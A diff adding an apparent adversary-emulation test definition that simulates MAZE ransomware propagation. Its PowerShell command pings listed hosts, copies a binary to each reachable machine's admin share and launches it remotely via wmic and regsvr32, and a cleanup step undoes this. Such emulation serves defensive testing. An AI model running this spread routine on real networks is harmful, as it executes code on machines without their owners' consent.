@@ -1,0 +1,34 @@
+- description: "This test simulates MAZE ransomware's propogation script that searches\
+    \ through a list of computers, tests connectivity to them, and copies a binary\
+    \ file to the Windows\\Temp directory of each one. \nUpon successful execution,\
+    \ a specified binary file will attempt to be copied to each online machine, a\
+    \ list of the online machines, as well as a list of offline machines will be output\
+    \ to a specified location.\nReference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html\
+    \ \n"
+  id: b944f7b8548f3a3c8036f1b55324f881
+  name: MAZE Propagation Script
+  platforms:
+    windows:
+      psh:
+        cleanup: 'if (test-path "$env:temp\T1105CompletedHosts.txt") ; {foreach ($machine
+          in get-content -path "$env:temp\T1105CompletedHosts.txt"); {wmic /node:
+          "$machine" process where name=''"regsvr32.exe"'' call terminate | out-null;
+          Remove-Item -path "\\$machine\C$\Windows\Temp\T1105.exe" -force -erroraction
+          silentlycontinue}}; Remove-Item -path "$env:temp\T1105OfflineHosts.txt"
+          -erroraction silentlycontinue; Remove-item -path "$env:temp\T1105CompletedHosts.txt"
+          -erroraction silentlycontinue'
+        command: '$machine_list = "$env:temp\T1105MachineList.txt"; $offline_list
+          = "$env:temp\T1105OfflineHosts.txt"; $completed_list = "$env:temp\T1105CompletedHosts.txt";
+          foreach ($machine in get-content -path "$machine_list"); {if (test-connection
+          -Count 1 -computername $machine -quiet) ; {cmd /c copy "$env:comspec" "\\$machine\C$\Windows\Temp\T1105.exe";
+          echo $machine >> "$completed_list"; wmic /node: "$machine" process call
+          create "regsvr32.exe /i C:\Windows\Temp\T1105.exe"}; else; {echo $machine
+          >> "$offline_list"}}'
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
